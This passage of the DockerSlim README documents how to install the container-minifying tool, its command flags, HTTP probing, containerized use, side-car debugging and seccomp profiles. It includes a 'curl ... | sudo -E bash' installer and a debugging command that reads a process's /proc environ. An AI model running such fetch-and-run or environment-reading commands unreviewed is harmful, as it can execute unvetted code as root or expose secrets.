CONTAINERS MINIFYING COMMAND LINE TOOLS QUICK SECCOMP EXAMPLE USING AUTO-GENERATED SECCOMP PROFILES ORIGINAL DEMO VIDEO DEMO STEPS FAQ Is it safe for production use? How can I contribute if I don't know Go? What's the best application for DockerSlim? Can I use DockerSlim with dockerized command line tools? What if my Docker images uses the USER command? Nginx fails in my minified image DockerSlim fails with a 'no permission to read from' error BUILD PROCESS Build Steps CONTRIBUTING DESIGN CORE CONCEPTS DYNAMIC ANALYSIS OPTIONS SECURITY CHALLENGES DEVELOPMENT PROGRESS TODO ORIGINS MINIFIED DOCKER HUB IMAGES LICENSE RECENT UPDATES Latest version: 1.37.0 (9/23/2021) The 1.37.0 releases adds experimental docker-compose support for the build command. For more info about the latest release see the CHANGELOG. INSTALLATION If you already have docker-slim installed use the update command to get the latest version: Downloads Download the zip package for your platform. Latest Mac binaries (curl -L -o ds.zip https://downloads.dockerslim.com/releases/1.37.0/dist_mac.zip) Latest Mac M1 binaries (curl -L -o ds.zip https://downloads.dockerslim.com/releases/1.37.0/dist_mac_m1.zip) Latest Linux binaries (curl -L -o ds.tar.gz https://downloads.dockerslim.com/releases/1.37.0/dist_linux.tar.gz) Latest Linux ARM binaries (curl -L -o ds.tar.gz https://downloads.dockerslim.com/releases/1.37.0/dist_linux_arm.tar.gz) Latest Linux ARM64 binaries (curl -L -o ds.tar.gz https://downloads.dockerslim.com/releases/1.37.0/dist_linux_arm64.tar.gz) Unzip the package and optionally move it to your bin directory. Linux (for non-intel replace dist_linux with the platform-specific extracted path): tar -xvf ds.tar.gz mv dist_linux/docker-slim /usr/local/bin/ mv dist_linux/docker-slim-sensor /usr/local/bin/ Mac: unzip ds.zip mv dist_mac/docker-slim /usr/local/bin/ mv dist_mac/docker-slim-sensor /usr/local/bin/ Add the location where you unzipped the package to your PATH environment variable (optional). If the directory where you extracted the binaries is not in your PATH then you'll need to run your docker-slim commands from that directory. Scripted Install You can also use this script to install the current release of DockerSlim on Linux (x86 and ARM) and macOS (x86 and Apple Silicon) curl -sL https://raw.githubusercontent.com/docker-slim/docker-slim/master/scripts/install-dockerslim.sh | sudo -E bash - Homebrew The Homebrew installer: https://formulae.brew.sh/formula/docker-slim Docker docker pull dslim/docker-slim See the RUNNING CONTAINERIZED section for more usage info. SaaS Powered by DockerSlim. It will help you understand and troubleshoot your application containers and a lot more. If you use the xray command you'll want to try the SaaS. Understanding image changes is easy with its container diff capabilities. Connect your own registry and you can do the same with your own containers. Try it here without installing anything locally. BASIC USAGE INFO docker-slim [global flags] [lint|xray|build|profile|update|version|help] [command-specific flags] <IMAGE_ID_OR_NAME> If you don't specify any command docker-slim will start in the interactive prompt mode. COMMANDS build - Analyzes, profiles and optimizes your container image generating the supported security profiles. This is the most popular command. xray - Performs static analysis for the target container image (including 'reverse engineering' the Dockerfile for the image). Use this command if you want to know what's inside of your container image and what makes it fat. lint - Analyzes container instructions in Dockerfiles (Docker image support is WIP) profile - Performs basic container image analysis and dynamic container analysis, but it doesn't generate an optimized image. run - Runs one or more containers (for now runs a single container similar to docker run) version - Shows the version information. update - Updates docker-slim to the latest version. help - Show the available commands and global flags Example: docker-slim build my/sample-app See the USAGE DETAILS section for more details. You can also get additional information about the parameters running docker-slim. Run docker-slim help to get a high level overview of the available commands. Run a docker-slim command without any parameters and you'll get more information about that command (e.g., docker-slim build). If you run docker-slim without any parameters you'll get an interactive prompt that will provide suggestions about the available commands and flags. Tabs are used to show the available options, to autocomplete the parameters and to navigate the option menu (which you can also do with Up and Down arrows). Spaces are used to move to the next parameter and Enter is used to run the command. For more info about the interactive prompt see go-prompt. USAGE DETAILS docker-slim [global options] command [command options] <target image ID or name> Commands: lint - Lint the target Dockerfile (or image, in the future) xray - Show what's in the container image and reverse engineer its Dockerfile build - Analyze the target container image along with its application and build an optimized image from it profile - Collect fat image information and generate a fat container report version - Show docker-slim and docker version information update - Update docker-slim help - Show help info Global options: --report - command report location (target location where to save the executed command results; slim.report.json by default; set it to off to disable) --check-version - check if the current version is outdated --version - print the version --debug - enable debug logs --verbose - enable info logs --log-level - set the logging level ('debug', 'info', 'warn' (default), 'error', 'fatal', 'panic') --log-format - set the format used by logs ('text' (default), or 'json') --log - log file to store logs --host - Docker host address --tls - use TLS connecting to Docker --tls-verify - do TLS verification --tls-cert-path - path to TLS cert files --state-path value - DockerSlim state base path (must set it if the DockerSlim binaries are not in a writable directory!) --archive-state - Archives DockerSlim state to the selected Docker volume (default volume - docker-slim-state). By default, enabled when DockerSlim is running in a container (disabled otherwise). Set it to off to disable explicitly. --in-container - Set it to true to explicitly indicate that DockerSlim is running in a container (if it's not set DockerSlim will try to analyze the environment where it's running to determine if it's containerized) To get more command line option information run docker-slim without any parameters or select one of the top level commands to get the command-specific information. To disable the version checks set the global --check-version flag to false (e.g., --check-version=false) or you can use the DSLIM_CHECK_VERSION environment variable. LINT COMMAND OPTIONS --target - target Dockerfile path (or Docker image, in the future; if you don't use this flag you must specify the target as the argument to the command) --target-type - explicitly specify the command target type (values: dockerfile, image) --skip-build-context - don't try to analyze build context build-context-dir - explicitly specify the build context directory skip-dockerignore - don't try to analyze .dockerignore include-check-label - include checks with the selected label key:value exclude-check-label - exclude checks with the selected label key:value include-check-id - check ID to include include-check-id-file - file with check IDs to include exclude-check-id - check ID to exclude exclude-check-id-file - file with check IDs to exclude show-nohits - show checks with no matches show-snippet - show check match snippet (default value: true) list-checks - list available checks (don't need to specify the target flag if you just want to list the available checks) XRAY COMMAND OPTIONS --target - Target container image (name or ID) --pull - Try pulling target if it's not available locally (default: false). --docker-config-path - Set the docker config path used to fetch credentials. Must be used with the --pull flag. --registry-username - Set the username to be used for an image pull on a private registry. Must be used with the --pull flag. --registry-password - Set the password to be used for an image pull on a private registry. Must be used with the --pull flag. --show-plogs - Show image pull logs (default: false). --changes value - Show layer change details for the selected change type (values: none, all, delete, modify, add). --changes-output value - Where to show the changes (values: all, report, console). --layer value - Show details for the selected layer (using layer index or ID) --add-image-manifest - Add raw image manifest to the command execution report file --add-image-config - Add raw image config object to the command execution report file --layer-changes-max - Maximum number of changes to show for each layer --all-changes-max - Maximum number of changes to show for all layers --add-changes-max - Maximum number of add changes to show for all layers --modify-changes-max - Maximum number of modify changes to show for all layers --delete-changes-max - Maximum number of delete changes to show for all layers --change-path value - Include changes for the files that match the path pattern (Glob/Match in Go and **). Value formats: <path pattern> | dump:<output type>:<path pattern> | ::<path pattern> where output type is console or a directory name. If value starts with dump: the match will be 'dumped' to the selected output type. [can use this flag multiple times] --change-data value - Include changes for the files that match the data pattern (regex). Value formats: <data regex> | dump:<output type>:<path pattern>:<data regex> | ::<path pattern>:<data regex> | :::<data regex> where output type is console or a directory name. If value starts with dump: the match will be 'dumped' to the selected output type. [can use this flag multiple times] --change-data-hash value - Include changes for the files that match the provided data hashes (sha1). Value formats: <sha1 hash> | dump:<output type>:<sha1 hash> | ::<sha1 hash> where output type is console or a directory name. If value starts with dump: the match will be 'dumped' to the selected output type. [can use this flag multiple times] --reuse-saved-image - Reuse saved container image (default: true). --top-changes-max - Maximum number of top changes to track (defalt: 20). --hash-data - Generate file data hashes (default: false). --detect-duplicates - Detect duplicate files based on their hashes (default: false). --show-duplicates - Show all discovered duplicate file paths (default: true). --detect-utf8 - Detect utf8 files and optionally extract the discovered utf8 file content (possible values: \"true\" or \"dump\" or \"dump:output_target.tgz\" or \"dump:output_target.tgz::max_size_bytes\" or \"dump:output_target.tgz:::max_size_bytes\"). --detect-all-certs - Detect all certifcate files --detect-all-cert-pks - Detect all certifcate private key files --change-match-layers-only - Show only layers with change matches (default: false). --export-all-data-artifacts - Archive path to export all data artifacts enabling the related flags if not set (if set to . then path defaults to ./data-artifacts.tar) --remove-file-artifacts - Remove file artifacts when command is done (note: you'll loose the reverse engineered Dockerfile) Change Types: none - Don't show any file system change details in image layers (the top changes from the corresponding layer are still shown) all - Show all file system change details in image layers delete - Show only delete file system change details in image layers modify - Show only modify file system change details in image layers add - Show only 'add' file system change details in image layers In the interactive CLI prompt mode you must specify the target image using the --target flag while in the traditional CLI mode you can use the --target flag or you can specify the target image as the last value in the command. BUILD COMMAND OPTIONS --target - Target container image (name or ID). It's an alternative way to provide the target information. The standard way to provide the target information is by putting as the last value in the build command CLI call. --pull - Try pulling target if it's not available locally (default: false). --docker-config-path - Set the docker config path used to fetch credentials. Must be used with the --pull flag. --registry-username - Set the username to be used for an image pull on a private registry. Must be used with the --pull flag. --registry-password - Set the password to be used for an image pull on a private registry. Must be used with the --pull flag. --show-plogs - Show image pull logs (default: false). compose-file - Load container info from selected compose file target-compose-svc - Target service from compose file target-compose-svc-no-ports - Do not publish ports for target service from compose file dep-exclude-compose-svc-all - Do not start any compose services as target dependencies dep-include-compose-svc - Include specific compose service as a target dependency (only selected services will be started) dep-exclude-compose-svc - Exclude specific service from the compose services that will be started as target dependencies dep-include-compose-svc-deps - Include all dependencies for the selected compose service (excluding the service itself) as target dependencies compose-net - Attach target to the selected compose network(s) otherwise all networks will be attached --http-probe - Enables/disables HTTP probing (ENABLED by default; you have to disable the probe if you don't need it by setting the flag to false: --http-probe=false) --http-probe-off - Alternative way to disable HTTP probing --http-probe-cmd - Additional HTTP probe command [can use this flag multiple times] --http-probe-cmd-file - File with user defined HTTP probe commands --http-probe-retry-count - Number of retries for each HTTP probe (default value: 5) --http-probe-retry-wait - Number of seconds to wait before retrying HTTP probe (doubles when target is not ready; default value: 8) --http-probe-ports - Explicit list of ports to probe (in the order you want them to be probed; excluded ports are not probed!) --http-probe-full - Do full HTTP probe for all selected ports (if false, finish after first successful scan; default value: false) --http-probe-exit-on-failure - Exit when all HTTP probe commands fail (default value: true) --http-probe-crawl - Enable crawling for the default HTTP probe command (default value: true) --http-crawl-max-depth - Max depth to use for the HTTP probe crawler (default value: 3) --http-crawl-max-page-count - Max number of pages to visit for the HTTP probe crawler (default value: 1000) --http-crawl-concurrency - Number of concurrent workers when crawling an HTTP target (default value: 10) --http-max-concurrent-crawlers - Number of concurrent crawlers in the HTTP probe (default value: 1) --http-probe-apispec - Run HTTP probes for API spec where the value represents the target path where the spec is available (supports Swagger 2.x and OpenAPI 3.x) [can use this flag multiple times] --http-probe-apispec-file - Run HTTP probes for API spec from file (supports Swagger 2.x and OpenAPI 3.x) [can use this flag multiple times] --http-probe-exec - App to execute when running HTTP probes. [can use this flag multiple times] --http-probe-exec-file - Apps to execute when running HTTP probes loaded from file. --publish-port - Map container port to host port analyzing image at runtime to make it easier to integrate external tests (format => port | hostPort:containerPort | hostIP:hostPort:containerPort | hostIP::containerPort )[can use this flag multiple times] --publish-exposed-ports - Map all exposed ports to the same host ports analyzing image at runtime (default value: false) --show-clogs - Show container logs (from the container used to perform dynamic inspection) --show-blogs - Show build logs (when the minified container is built) --copy-meta-artifacts - Copy meta artifacts to the provided location --remove-file-artifacts - Remove file artifacts when command is done (note: you'll loose autogenerated Seccomp and Apparmor profiles unless you copy them with the copy-meta-artifacts flag or if you archive the state) --tag - Use a custom tag for the generated image (instead of the default value: <original_image_name>.slim) [can use this flag multiple times if you need to create additional tags for the optimized image] --entrypoint - Override ENTRYPOINT analyzing image at runtime --cmd - Override CMD analyzing image at runtime --mount - Mount volume analyzing image (the mount parameter format is identical to the -v mount command in Docker) [can use this flag multiple times] --include-path - Include directory or file from image [can use this flag multiple times] (optionally overwriting the artifact's permissions, user and group information; format: target:octalPermFlags#uid#gid ; see the non-default USER FAQ section for more details) --include-path-file - Load directory or file includes from a file (optionally overwriting the artifact's permissions, user and group information; format: target:octalPermFlags#uid#gid ; see the non-default USER FAQ section for more details) --include-bin value - Include binary from image (executable or shared object using its absolute path) --include-bin-file - Load shared binary file includes from a file (similar to --include-path-file) --include-exe value - Include executable from image (by executable name) --include-exe-file - Load executable file includes from a file (similar to --include-path-file) --include-shell - Include basic shell functionality (default value: false) include-cert-all - Keep all discovered cert files include-cert-bundles-only - Keep only cert bundles include-cert-dirs - Keep known cert directories and all files in them include-cert-pk-all - Keep all discovered cert private keys include-cert-pk-dirs - Keep known cert private key directories and all files in them --preserve-path - Keep path from orignal image in its initial state. [can use this flag multiple times] --preserve-path-file - File with paths to keep from original image in their original state. --path-perms - Set path permissions/user/group in optimized image (format: target:octalPermFlags#uid#gid ; see the non-default USER FAQ section for more details) --path-perms-file - File with path permissions to set (format: target:octalPermFlags#uid#gid ; see the non-default USER FAQ section for more details) --exclude-pattern - Exclude path pattern (Glob/Match in Go and **) from image --exclude-mounts - Exclude mounted volumes from image (default value: true) --label - Override or add LABEL analyzing image at runtime [can use this flag multiple times] --volume - Add VOLUME analyzing image at runtime [can use this flag multiple times] --env - Override ENV analyzing image at runtime [can use this flag multiple times] --workdir - Override WORKDIR analyzing image at runtime --network - Override default container network settings analyzing image at runtime --expose - Use additional EXPOSE instructions analyzing image at runtime [can use this flag multiple times] --link - Add link to another container analyzing image at runtime [can use this flag multiple times] --hostname - Override default container hostname analyzing image at runtime --etc-hosts-map - Add a host to IP mapping to /etc/hosts analyzing image at runtime [can use this flag multiple times] --container-dns - Add a dns server analyzing image at runtime [can use this flag multiple times] --container-dns-search - Add a dns search domain for unqualified hostnames analyzing image at runtime [can use this flag multiple times] --image-overrides - Save runtime overrides in generated image (values is all or a comma delimited list of override types: entrypoint, cmd, workdir, env, expose, volume, label). Use this flag if you need to set a runtime value and you want to persist it in the optimized image. If you only want to add, edit or delete an image value in the optimized image use one of the --new-* or --remove-* flags (define below). --continue-after - Select continue mode: enter | signal | probe | exec | timeout or numberInSeconds (default value if http probes are disabled: enter). You can also select probe and exec together: 'probe&exec' (make sure to use quotes around the two modes or the & will break the shell command). --dockerfile - The source Dockerfile name to build the fat image before it's optimized. --tag-fat - Custom tag for the fat image built from Dockerfile. --cbo-add-host - Add an extra host-to-IP mapping in /etc/hosts to use when building an image (Container Build Option). --cbo-build-arg - Add a build-time variable (Container Build Option). --cbo-label - Add a label when building from Dockerfiles (Container Build Option). --cbo-target - Target stage to build for multi-stage Dockerfiles (Container Build Option). --cbo-network - Networking mode to use for the RUN instructions at build-time (Container Build Option). --cbo-cache-from - Add an image to the build cache (Container Build Option). --cro-runtime - Runtime to use with the created containers (Container Runtime Option). --cro-host-config-file - File to load the Docker host configuration data (JSON format) to use when running the container. See the HostConfig struct definition from the go-dockerclient package for configuration details. Note that docker-slim will automatically add SYS_ADMIN to the list of capabilities and run the container in privileged mode, which are required to generate the seccomp profiles. The host config parameters specified using their standalone build or profile command flags overwrite the values in the host config file (volume binds are merged). --cro-sysctl - Set namespaced kernel parameters in the created container (Container Runtime Option). --cro-shm-size - Shared memory size for /dev/shm in the created container (Container Runtime Option). --use-local-mounts - Mount local paths for target container artifact input and output (off, by default) --use-sensor-volume - Sensor volume name to use (set it to your Docker volume name if you manage your own docker-slim sensor volume). --keep-tmp-artifacts - Keep temporary artifacts when command is done (off, by default). --keep-perms - Keep artifact permissions as-is (true, by default) --run-target-as-user - Run target app (in the temporary container) as USER from Dockerfile (true, by default) --new-entrypoint - New ENTRYPOINT instruction for the optimized image --new-cmd - New CMD instruction for the optimized image --new-expose - New EXPOSE instructions for the optimized image --new-workdir - New WORKDIR instruction for the optimized image --new-env - New ENV instructions for the optimized image --new-label - New LABEL instructions for the optimized image --new-volume - New VOLUME instructions for the optimized image --remove-volume - Remove VOLUME instructions for the optimized image --remove-env - Remove ENV instructions for the optimized image --remove-label - Remove LABEL instructions for the optimized image --remove-expose - Remove EXPOSE instructions for the optimized image --exec - A shell script snippet to run via Docker exec --exec-file - A shell script file to run via Docker exec In the interactive CLI prompt mode you must specify the target image using the --target flag while in the traditional CLI mode you can use the --target flag or you can specify the target image as the last value in the command. The --include-path option is useful if you want to customize your minified image adding extra files and directories. The --include-path-file option allows you to load multiple includes from a newline delimited file. Use this option if you have a lot of includes. The includes from --include-path and --include-path-file are combined together. You can also use the --exclude-pattern flag to control what shouldn't be included. The --continue-after option is useful if you need to script docker-slim. If you pick the probe option then docker-slim will continue executing the build command after the HTTP probe is done executing. If you pick the exec options then docker-slim will continue executing the build command after the container exec shell commands (specified using the --exec-file or --exec flags) are done executing. If you pick the timeout option docker-slim will allow the target container to run for 60 seconds before it will attempt to collect the artifacts. You can specify a custom timeout value by passing a number of seconds you need instead of the timeout string. If you pick the signal option you'll need to send a USR1 signal to the docker-slim process. The signal option is useful when you want to run your own tests against the temporary container docker-slim creates. Your test automation / CI/CD pipeline will be able to notify docker-slim that it's done running its test by sending the USR1 to it. You can also combine multiple continue-after modes. For now only combining probe and exec is supported (using either probe&exec or exec&probe as the --continue-after flag value). Other combinations may work too. Combining probe and signal is not supported. The --include-shell option provides a simple way to keep a basic shell in the minified container. Not all shell commands are included. To get additional shell commands or other command line utilities use the --include-exe and/or --include-bin options. Note that the extra apps and binaries might missed some of the non-binary dependencies (which don't get picked up during static analysis). For those additional dependencies use the --include-path and --include-path-file options. The --dockerfile option makes it possible to build a new minified image directly from source Dockerfile. Pass the Dockerfile name as the value for this flag and pass the build context directory or URL instead of the docker image name as the last parameter for the docker-slim build command: docker-slim build --dockerfile Dockerfile --tag my/custom_minified_image_name . If you want to see the console output from the build stages (when the fat and slim images are built) add the --show-blogs build flag. Note that the build console output is not interactive and it's printed only after the corresponding build step is done. The fat image created during the build process has the .fat suffix in its name. If you specify a custom image tag (with the --tag flag) the .fat suffix is added to the name part of the tag. If you don't provide a custom tag the generated fat image name will have the following format: docker-slim-tmp-fat-image.<pid_of_docker-slim>.<current_timestamp>. The minified image name will have the .slim suffix added to that auto-generated container image name (docker-slim-tmp-fat-image.<pid_of_docker-slim>.<current_timestamp>.slim). Take a look at this python examples to see how it's using the --dockerfile flag. The --use-local-mounts option is used to choose how the docker-slim sensor is added to the target container and how the sensor artifacts are delivered back to the master. If you enable this option you'll get the original docker-slim behavior where it uses local file system volume mounts to add the sensor executable and to extract the artifacts from the target container. This option doesn't always work as expected in the dockerized environment where docker-slim itself is running in a Docker container. When this option is disabled (default behavior) then a separate Docker volume is used to mount the sensor and the sensor artifacts are explicitly copied from the target container. RUNNING CONTAINERIZED The current version of docker-slim is able to run in containers. It will try to detect if it's running in a containerized environment, but you can also tell docker-slim explicitly using the --in-container global flag. You can run docker-slim in your container directly or you can use the docker-slim container in your containerized environment. If you are using the docker-slim container make sure you run it configured with the Docker IPC information, so it can communicate with the Docker daemon. The most common way to do it is by mounting the Docker unix socket to the docker-slim container. Some containerized environments (like Gitlab and their dind service) might not expose the Docker unix socket to you, so you'll need to make sure the environment variables used to communicate with Docker (e.g., DOCKER_HOST) are passed to the docker-slim container. Note that if those environment variables reference any kind of local host names those names need to be replaced or you need to tell docker-slim about them using the --etc-hosts-map flag. If those environment variables reference local files those local files (e.g., files for TLS cert validation) will need to be copied to a temporary container, so that temporary container can be used as a data container to make those files accessible by the docker-slim container. When docker-slim runs in a container it will attempt to save its execution state in a separate Docker volume. If the volume doesn't exist it will try to create it (docker-slim-state, by default). You can pick a different state volume or disable this behavior completely by using the global --archive-state flag. If you do want to persist the docker-slim execution state (which includes the seccomp and AppArmor profiles) without using the state archiving feature you can mount your own volume that maps to the /bin/.docker-slim-state directory in the docker-slim container. By default, docker-slim will try to create a Docker volume for its sensor unless one already exists. If this behavior is not supported by your containerized environment you can create a volume separately and pass its name to docker-slim using the --use-sensor-volume flag. Here's a basic example of how to use the containerized version of docker-slim: docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock dslim/docker-slim build your-docker-image-name Here's a GitLab example for their dind .gitlab-ci.yml config file: docker run -e DOCKER_HOST=tcp://$(grep docker /etc/hosts | cut -f1):2375 dslim/docker-slim build your-docker-image-name Here's a CircleCI example for their remote docker .circleci/config.yml config file (used after the setup_remote_docker step): docker create -v /dcert_path --name dcert alpine:latest /bin/true docker cp $DOCKER_CERT_PATH/. dcert:/dcert_path docker run --volumes-from dcert -e DOCKER_HOST=$DOCKER_HOST -e DOCKER_TLS_VERIFY=$DOCKER_TLS_VERIFY -e DOCKER_CERT_PATH=/dcert_path dslim/docker-slim build your-docker-image-name DOCKER CONNECT OPTIONS If you don't specify any Docker connect options docker-slim expects to find the following environment variables: DOCKER_HOST, DOCKER_TLS_VERIFY (optional), DOCKER_CERT_PATH (required if DOCKER_TLS_VERIFY is set to \"1\") On Mac OS X you get them when you run eval \"$(docker-machine env default)\" or when you use the Docker Quickstart Terminal. If the Docker environment variables are configured to use TLS and to verify the Docker cert (default behavior), but you want to disable the TLS verification you can override the TLS verification behavior by setting the --tls-verify to false: docker-slim --tls-verify=false build my/sample-node-app-multi You can override all Docker connection options using these flags: --host, --tls, --tls-verify, --tls-cert-path. These flags correspond to the standard Docker options (and the environment variables). If you want to use TLS with verification: docker-slim --host=tcp://192.168.99.100:2376 --tls-cert-path=/Users/youruser/.docker/machine/machines/default --tls=true --tls-verify=true build my/sample-node-app-multi If you want to use TLS without verification: docker-slim --host=tcp://192.168.99.100:2376 --tls-cert-path=/Users/youruser/.docker/machine/machines/default --tls=true --tls-verify=false build my/sample-node-app-multi If the Docker environment variables are not set and if you don't specify any Docker connect options docker-slim will try to use the default unix socket. HTTP PROBE COMMANDS If the HTTP probe is enabled (note: it is enabled by default) it will default to running GET / with HTTP and then HTTPS on every exposed port. You can add additional commands using the --http-probe-cmd and --http-probe-cmd-file options. If you want to disable HTTP probing set the --http-probe flag to false (e.g., --http-probe=false). You can also use the --http-probe-off flag to do the same (simply use the flag without any parameters). The --http-probe-cmd option is good when you want to specify a small number of simple commands where you select some or all of these HTTP command options: crawling (defaults to false), protocol, method (defaults to GET), resource (path and query string). If you only want to use custom HTTP probe command and you don't want the default GET / command added to the command list you explicitly provided you'll need to set --http-probe to false when you specify your custom HTTP probe command. Note that this inconsistency will be addressed in the future releases to make it less confusing. Possible field combinations: /path - runs GET /path crawl:/path - runs GET /path and then crawls the pages referenced by the target page post:/path - runs POST /path crawl:get:/path - runs GET /path and then crawls the pages referenced by the target page https:get:/path runs GET /path only on https crawl:http:get:/path - runs GET /path and then crawls the pages referenced by the target page Here are a couple of examples: Adds two extra probe commands: GET /api/info and POST /submit (tries http first, then tries https): docker-slim build --show-clogs --http-probe-cmd /api/info --http-probe-cmd POST:/submit my/sample-node-app-multi Adds one extra probe command: POST /submit (using only http): docker-slim build --show-clogs --http-probe-cmd http:POST:/submit my/sample-node-app-multi The --http-probe-cmd-file option is good when you have a lot of commands and/or you want to select additional HTTP command options. Available HTTP command options: method - HTTP method to use resource - target resource URL port - port number protocol - http, https, http2, http2c (cleartext version of http2), ws, wss (secure websocket) headers - array of strings with column delimited key/value pairs (e.g., \"Content-Type: application/json\") body - request body as a string body_file - request body loaded from the provided file username - username to use for basic auth password - password to use for basic auth crawl - boolean to indicate if you want to crawl the target (to visit all referenced resources) Here's a probe command file example: docker-slim build --show-clogs --http-probe-cmd-file probeCmds.json my/sample-node-app-multi Commands in probeCmds.json: { \"commands\": [ { \"resource\": \"/api/info\" }, { \"method\": \"POST\", \"resource\": \"/submit\" }, { \"procotol\": \"http\", \"resource\": \"/api/call?arg=one\" }, { \"protocol\": \"http\", \"method\": \"POST\", \"resource\": \"/submit2\", \"body\": \"key=value\" }, { \"protocol\": \"http\", \"method\": \"POST\", \"resource\": \"/submit3\", \"body_file\": \"mydata.json\", \"headers\": [\"Content-Type: application/json\"] } ] } The HTTP probe command file path can be a relative path (relative to the current working directory) or it can be an absolute path. For each HTTP probe call docker-slim will print the call status. Example: info=http.probe.call status=200 method=GET target=http://127.0.0.1:32899/ attempt=1 error=none. You can execute your own external HTTP requests using the target.port.list field in the container info message docker-slim prints when it starts its test container: docker-slim[build]: info=container name=<your_container_name> id=<your_container_id> target.port.list=[<comma_separated_list_of_port_numbers_to_use>] target.port.info=[<comma_separated_list_of_port_mapping_records>]. Example: docker-slim[build]: info=container name=dockerslimk_42861_20190203084955 id=aa44c43bcf4dd0dae78e2a8b3ac011e7beb6f098a65b09c8bce4a91dc2ff8427 target.port.list=[32899] target.port.info=[9000/tcp => 0.0.0.0:32899]. With this information you can run curl or other HTTP request generating tools: curl http://localhost:32899. The current version also includes an experimental crawling capability. To enable it for the default HTTP probe use the --http-probe-crawl flag. You can also enable it for the HTTP probe commands in your command file using the crawl boolean field. When crawling is enabled the HTTP probe will act like a web crawler following the links it finds in the target endpoint. Probing based on the Swagger/OpenAPI spec is another experimental capability. This feature introduces two new flags: http-probe-apispec - value: <path_to_fetch_spec>:<api_endpoint_prefix> http-probe-apispec-file - value: <local_file_path_to_spec> You can use the --http-probe-exec and --http-probe-exec-file options to run the user provided commands when the http probes are executed. This example shows how you can run curl against the temporary docker-slim created container when the http probes are executed. docker-slim build --http-probe-exec 'curl http://localhost:YOUR_CONTAINER_PORT_NUM/some/path' --publish-port YOUR_CONTAINER_PORT_NUM your-container-image-name DEBUGGING MINIFIED CONTAINERS You can create dedicated debugging side-car container images loaded with the tools you need for debugging target containers. This allows you to keep your production container images small. The debugging side-car containers attach to the running target containers. Assuming you have a running container named node_app_alpine you can attach your debugging side-car with a command like this: docker run --rm -it --pid=container:node_app_alpine --net=container:node_app_alpine --cap-add sys_admin alpine sh. In this example, the debugging side-car is a regular alphine image. This is exactly what happens with the node_alpine app sample (located in the node_alpine directory of the examples repo) and the run_debug_sidecar.command helper script. If you run the ps command in the side-car you'll see the application from the target container: # ps PID USER TIME COMMAND 1 root 0:00 node /opt/my/service/server.js 13 root 0:00 sh 38 root 0:00 ps You can access the target container file system through /proc/<TARGET_PID>/root: # ls -lh /proc/1/root/opt/my/service total 8 drwxr-xr-x 3 root root 4.0K Sep 2 15:51 node_modules -rwxr-xr-x 1 root root 415 Sep 8 00:52 server.js Some of the useful debugging commands include cat /proc/<TARGET_PID>/cmdline, ls -l /proc/<TARGET_PID>/cwd, cat /proc/1/environ, cat /proc/<TARGET_PID>/limits, cat /proc/<TARGET_PID>/status and ls -l /proc/<TARGET_PID>/fd. MINIFYING COMMAND LINE TOOLS Unless the default CMD instruction in your Dockerfile is sufficient you'll have to specify command line parameters when you execute the build command in DockerSlim. This can be done with the --cmd option. Other useful command line parameters: --show-clogs - use it if you want to see the output of your container. --mount - use it to mount a volume when DockerSlim inspects your image. --entrypoint - use it if you want to override the ENTRYPOINT instruction when DockerSlim inspects your image. Note that the --entrypoint and --cmd options don't override the ENTRYPOINT and CMD instructions in the final minified image. Here's a sample build command: docker-slim build --show-clogs=true --cmd docker-compose.yml --mount $(pwd)/data/:/data/ dslim/container-transform It's used to minify the container-transform tool. You can get the minified image from Docker Hub. QUICK SECCOMP EXAMPLE If you want to auto-generate a Seccomp profile AND minify your image use the build command. If you only want to auto-generate a Seccomp profile (along with other interesting image metadata) use the profile command. Step one: run DockerSlim docker-slim build your-name/your-app Step two: use the generated Seccomp profile docker run --security-opt seccomp:<docker-slim directory>/.images/<YOUR_APP_IMAGE_ID>/artifacts/your-name-your-app-seccomp.json <your other run params> your-name/your-app Feel free to copy the generated profile :-) You can use the generated Seccomp profile with your original image or with the minified image. USING AUTO-GENERATED SECCOMP PROFILES You can use the generated profile with your original image or with the minified image DockerSlim created: docker run -it --rm --security-opt seccomp:path_to/my-sample-node-app-seccomp.json -p 8000:8000 my/sample-node-app.slim ORIGINAL DEMO VIDEO Demo video on YouTube DEMO STEPS The demo runs on Mac OS X, but you can build a linux version. Note that these steps are different from the steps in the demo video. Get the docker-slim Mac, Mac M1, Linux, Linux ARM or Linux ARM64 binaries. Unzip them and optionally add their directory to your PATH environment variable if you want to use the app from other locations. The extracted directory contains two binaries: docker-slim <- the main application docker-slim-sensor <- the sensor application used to collect information from running containers Clone the examples repo to use the sample apps (note: the examples have been moved to a separate repo). You can skip this step if you have your own app. git clone https://github.com/docker-slim/examples.git Create a Docker image for the sample node.js app in examples/node_ubuntu. You can skip this step if you have your own app. cd examples/node_ubuntu eval \"$(docker-machine env default)\" <- optional (depends on how Docker is installed on your machine and what kind of Docker version you are using); if the Docker host is not running you'll need to start it first: docker-machine start default; see the Docker connect options section for more details. docker build -t my/sample-node-app . Run docker-slim: ./docker-slim build my/sample-node-app <- run it from the location where you extraced the docker-slim binaries (or update your PATH env var to include the docker-slim bin directory) DockerSlim creates a special container based on the target image you provided. It also creates a resource directory where it stores the information it discovers about your image: <docker-slim directory>/.images/<TARGET_IMAGE_ID>. By default, docker-slim will run its http probe against the temporary container. If you are minifying a command line tool that doesn't expose any web service interface you'll need to explicitly disable http probing (by setting --http-probe=false). Use curl (or other tools) to call the sample app (optional) curl http://<YOUR_DOCKER_HOST_IP>:<PORT> This is an optional step to make sure the target app container is doing something. Depending on the application it's an optional step. For some applications it's required if it loads new application resources dynamically based on the requests it's processing (e.g., Ruby or Python). You'll see the mapped ports printed to the console when docker-slim starts the target container. You can also get the port number either from the docker ps or docker port <CONTAINER_ID> commands. The current version of DockerSlim doesn't allow you to map exposed network ports (it works like docker run -P). Press and wait until docker-slim says it's done By default or when http probing is enabled explicitly docker-slim will continue its execution once the http probe is done running. If you explicitly picked a different continue-after option follow the expected steps. For example, for the enter continue-after option you must press the enter button on your keyboard. If http probing is enabled (when http-probe is set) and if continue-after is set to enter and you press the enter key before the built-in HTTP probe is done the probe might produce an EOF error because docker-slim will shut down the target container before all probe commands are done executing. It's ok to ignore it unless you really need the probe to finish. Once DockerSlim is done check that the new minified image is there docker images You should see my/sample-node-app.slim in the list of images. Right now all generated images have .slim at the end of its name. Use the minified image docker run -it --rm --name=\"slim_node_app\" -p 8000:8000 my/sample-node-app.slim FAQ Is it safe for production use? Yes! Either way, you should test your Docker images. How can I contribute if I don't know Go? You don't need to read the language spec and lots of books :-) Go through the Tour of Go and optionally read 50 Shades of Go and you'll be ready to contribute! What's the best application for DockerSlim? DockerSlim will work for any dockerized application; however, DockerSlim automates app interactions for applications with an HTTP API. You can use 